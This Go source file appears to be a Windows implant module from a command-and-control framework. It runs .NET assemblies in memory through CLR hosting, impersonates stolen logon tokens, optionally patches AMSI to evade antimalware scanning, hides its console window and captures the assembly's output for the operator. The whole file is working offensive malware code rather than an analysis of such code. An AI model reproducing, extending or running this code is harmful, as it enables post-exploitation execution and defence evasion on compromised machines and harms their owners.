// server/docker/payloads/Windows/action_inline_assembly.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	clr "github.com/almounah/go-buena-clr"
)

// Windows API Constants
const (
	STD_OUTPUT_HANDLE = ^uintptr(10) // -11
	STD_ERROR_HANDLE  = ^uintptr(11) // -12
	STD_INPUT_HANDLE  = ^uintptr(9)  // -10

	GENERIC_WRITE         = 0x40000000
	GENERIC_READ          = 0x80000000
	CREATE_ALWAYS         = 2
	FILE_ATTRIBUTE_NORMAL = 0x80
	OPEN_EXISTING         = 3

	FILE_MAP_ALL_ACCESS  = 0xF001F
	INVALID_HANDLE_VALUE = ^uintptr(0)

	// COM constants
	COINIT_APARTMENTTHREADED = 0x2
	COINIT_MULTITHREADED     = 0x0
)

// Windows error codes
const (
	ERROR_BROKEN_PIPE        = 109
	ERROR_PIPE_NOT_CONNECTED = 233
	ERROR_NO_DATA            = 232
)

// Windows API declarations
var (
	kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
	ole32       = syscall.NewLazyDLL("ole32.dll")
	user32      = syscall.NewLazyDLL("user32.dll")
	msvcrt      = syscall.NewLazyDLL("msvcrt.dll")

	// Console functions
	getStdHandle     = kernel32DLL.NewProc("GetStdHandle")
	setStdHandle     = kernel32DLL.NewProc("SetStdHandle")
	allocConsole     = kernel32DLL.NewProc("AllocConsole")
	freeConsole      = kernel32DLL.NewProc("FreeConsole")
	getConsoleWindow = kernel32DLL.NewProc("GetConsoleWindow")
	peekNamedPipe    = kernel32DLL.NewProc("PeekNamedPipe")

	// File functions
	createFileW = kernel32DLL.NewProc("CreateFileW")
	createFileA = kernel32DLL.NewProc("CreateFileA")
	closeHandle = kernel32DLL.NewProc("CloseHandle")
	readFile    = kernel32DLL.NewProc("ReadFile")
	writeFile   = kernel32DLL.NewProc("WriteFile")

	// COM functions
	coInitializeEx        = ole32.NewProc("CoInitializeEx")
	coUninitialize        = ole32.NewProc("CoUninitialize")
	flushInstructionCache = kernel32DLL.NewProc("FlushInstructionCache")

	// Window functions
	showWindow = user32.NewProc("ShowWindow")

	// CRT functions
	openOsfhandle = msvcrt.NewProc("_open_osfhandle")
	dup2          = msvcrt.NewProc("_dup2")
	closeFunc     = msvcrt.NewProc("_close")
)

// applyTokenContextForInlineAssembly applies token context for synchronous assembly execution
func applyTokenContextForInlineAssembly() func() {
	if globalTokenStore == nil {
		return func() {}
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var cleanupFunc func()

	// Priority: Network-only token > Regular impersonation
	if globalTokenStore.NetOnlyHandle != 0 {

		// Apply the network-only token
		err := ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle)
		if err == nil {
			cleanupFunc = func() {
				RevertToSelf()
			}
		} else {
		}
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		// Look up the token in the global store
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {

			err := ImpersonateLoggedOnUser(token)
			if err == nil {
				cleanupFunc = func() {
					RevertToSelf()
				}
			} else {
			}
		}
	}

	if cleanupFunc == nil {
		return func() {} // No-op if no impersonation needed
	}

	return cleanupFunc
}

// executeWithFileCapture uses file redirection which is more stable than pipes
func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// Initialize COM
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	// Create temp file for output
	tempDir := os.TempDir()
	outputFile := filepath.Join(tempDir, fmt.Sprintf("clr_output_%d.txt", time.Now().UnixNano()))

	// Create file handle
	outputPath, _ := syscall.UTF16PtrFromString(outputFile)
	fileHandle, _, _ := createFileW.Call(
		uintptr(unsafe.Pointer(outputPath)),
		GENERIC_WRITE|GENERIC_READ,
		0x00000003, // FILE_SHARE_READ | FILE_SHARE_WRITE
		0,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if fileHandle == 0 || fileHandle == ^uintptr(0) {
		// Fallback to no capture
		return executeWithoutCapture(assemblyBytes, arguments)
	}
	defer closeHandle.Call(fileHandle)
	defer os.Remove(outputFile)

	// Save original handles
	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)

	// Redirect to file
	setStdHandle.Call(STD_OUTPUT_HANDLE, fileHandle)
	setStdHandle.Call(STD_ERROR_HANDLE, fileHandle)

	// Also redirect Go's stdout/stderr
	oldStdout := os.Stdout
	oldStderr := os.Stderr

	outFile, err := os.OpenFile(outputFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err == nil {
		os.Stdout = outFile
		os.Stderr = outFile
		defer outFile.Close()
	}

	// Detect runtime
	targetRuntime := "v4"
	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
		targetRuntime = "v2"
	}

	// Execute assembly
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// Restore handles IMMEDIATELY
	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
	os.Stdout = oldStdout
	os.Stderr = oldStderr

	// Close file to flush
	if outFile != nil {
		outFile.Close()
	}
	closeHandle.Call(fileHandle)

	// Read output from file
	time.Sleep(100 * time.Millisecond) // Give time for flush
	output, _ := os.ReadFile(outputFile)

	return string(output), int(retCode), execErr
}

// executeWithoutCapture for maximum stability
func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	targetRuntime := "v4"
	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
		targetRuntime = "v2"
	}

	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	return "", int(retCode), execErr
}

func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, config struct {
	AssemblyB64 string   `json:"assembly_b64"`
	Arguments   []string `json:"arguments"`
	AppDomain   string   `json:"app_domain"`
	BypassAMSI  bool     `json:"bypass_amsi"`
	BypassETW   bool     `json:"bypass_etw"`
	RevertETW   bool     `json:"revert_etw"`
	EntryPoint  string   `json:"entry_point"`
	UsePipe     bool     `json:"use_pipe"`
	PipeName    string   `json:"pipe_name"`
}, executionNumber int) (string, int) {
	var output strings.Builder

	// Log current token context if active
	if globalTokenStore != nil {
		globalTokenStore.mu.RLock()
		if globalTokenStore.NetOnlyHandle != 0 {
			output.WriteString(fmt.Sprintf("[*] Using network-only token: %s\n", globalTokenStore.NetOnlyToken))
			output.WriteString("[*] This token will be used for network authentication\n")
		} else if globalTokenStore.IsImpersonating {
			output.WriteString(fmt.Sprintf("[*] Using impersonation token: %s\n", globalTokenStore.ActiveToken))
			output.WriteString("[!] WARNING: Regular impersonation may not work for network shares\n")
			output.WriteString("[!] Consider using 'make-token' with network-only flag for UNC paths\n")
		} else {
			output.WriteString("[!] No token context active - using current user context\n")
		}
		globalTokenStore.mu.RUnlock()
	}

	// Apply bypasses if needed
	if config.BypassAMSI {
		if err := patchAMSI(); err == nil {
			output.WriteString("[+] AMSI bypass applied\n")
		}
	}

	output.WriteString("[*] Executing assembly...\n")

	// Try synchronous capture first
	// removed debug log
	assemblyOutput, exitCode, err := executeWithSyncCapture(assemblyBytes, config.Arguments)

	if assemblyOutput == "" {
		// removed debug log
		assemblyOutput, exitCode, err = executeWithTestCapture(assemblyBytes, config.Arguments)
	}

	if assemblyOutput != "" {
		output.WriteString("\n========== Assembly Output ==========\n")
		output.WriteString(assemblyOutput)
		if !strings.HasSuffix(assemblyOutput, "\n") {
			output.WriteString("\n")
		}
		output.WriteString("=====================================\n")
	} else {
		output.WriteString("[!] No output captured (assembly may have executed successfully)\n")
	}

	if err != nil {
		output.WriteString("\n" + Err(E46) + "\n")
	}

	output.WriteString(fmt.Sprintf("\n[*] Exit code: %d\n", exitCode))
	output.WriteString(fmt.Sprintf("[*] Execution #%d completed\n", executionNumber))

	return output.String(), exitCode
}

// Simple synchronous version to avoid goroutine issues
func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	// removed debug log
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context BEFORE COM initialization
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// NOW initialize COM under the impersonated context
	// removed debug log
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
		// removed debug log
	}

	// Create pipe with buffer
	var readPipe, writePipe syscall.Handle
	// removed debug log
	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
	if err != nil {
		// Detect runtime version
		targetRuntime := "v4"
		if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
			targetRuntime = "v2"
		}
		retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
		return "", int(retCode), err
	}
	defer syscall.CloseHandle(readPipe)
	// removed debug log

	// Check/create console
	consoleCreated := false
	if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
		// removed debug log
		allocConsole.Call()
		consoleCreated = true
		if newWnd, _, _ := getConsoleWindow.Call(); newWnd != 0 {
			showWindow.Call(newWnd, SW_HIDE)
		}
	}

	// Save original handles
	// removed debug log
	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)

	// Redirect handles
	// removed debug log
	setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
	setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))

	// Critical: Redirect CRT file descriptors
	// removed debug log
	fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
	if fd != INVALID_HANDLE_VALUE {
		dup2.Call(fd, 1)
		dup2.Call(fd, 2)
		// removed debug log
	}

	// Detect runtime version
	targetRuntime := "v4"
	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
		targetRuntime = "v2"
	}

	// removed debug log
	// Execute the assembly
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// Close write pipe to signal EOF
	// removed debug log
	syscall.CloseHandle(writePipe)

	// Now read all data from the pipe
	// removed debug log
	var output bytes.Buffer
	buffer := make([]byte, 4096)

	for {
		var bytesAvail uint32
		var bytesRead uint32

		// Check if data is available
		ret, _, _ := peekNamedPipe.Call(
			uintptr(readPipe),
			0,
			0,
			0,
			uintptr(unsafe.Pointer(&bytesAvail)),
			0,
		)

		if ret == 0 || bytesAvail == 0 {
			break
		}


		// Read the available data
		ret, _, _ = readFile.Call(
			uintptr(readPipe),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
			uintptr(unsafe.Pointer(&bytesRead)),
			0,
		)

		if ret != 0 && bytesRead > 0 {
			output.Write(buffer[:bytesRead])
		} else {
			break
		}
	}

	// Restore handles
	// removed debug log
	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)

	// Clean up console
	if consoleCreated {
		freeConsole.Call()
	}

	result := output.String()
	// fmt.Printf("[DEBUG] Total output captured: %d bytes\n", len(result))

	return result, int(retCode), execErr
}

// Even simpler - just test if we can capture anything
func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	// removed debug log
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// Initialize COM
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	// Detect runtime version
	targetRuntime := "v4"
	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
		targetRuntime = "v2"
	}

	// Test 1: Can we execute at all?
	// removed debug log
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// The output we saw earlier suggests the assembly IS running
	// but Console.WriteLine is going somewhere else

	return "[Test execution completed - check debug console for actual output]", int(retCode), execErr
}

func verifyDirectoryAccess(path string) error {
	// Convert path to UTF16
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	// Try to get file attributes (basic access check)
	attrs, err := syscall.GetFileAttributes(pathPtr)
	if err != nil {
		return fmt.Errorf("cannot access path %s: %v", path, err)
	}

	if attrs == syscall.INVALID_FILE_ATTRIBUTES {
		return fmt.Errorf("invalid path or access denied: %s", path)
	}

	return nil
}
